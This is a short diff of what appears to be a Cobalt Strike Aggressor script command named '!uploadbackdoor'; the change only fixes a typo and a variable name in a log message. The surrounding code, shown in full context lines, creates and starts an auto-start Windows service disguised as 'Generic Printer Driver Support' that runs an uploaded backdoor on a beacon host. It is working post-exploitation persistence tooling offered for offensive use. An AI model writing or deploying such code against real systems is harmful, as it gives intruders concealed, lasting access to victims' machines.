@@ -19,5 +19,5 @@ command !uploadbackdoor {
 	servicefilename($2);
 	bshell($1, "sc create GenericPrinterDriver binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \"Generic Printer Driver Support\"");
 	bshell($1, "sc start GenericPrinterDriver");
-	elog("Backdoor service created on Becaon $1 using $servicebackdoor "); 
+	elog("Backdoor service created on beacon $1 using $servicebackdoorfilename "); 
 }
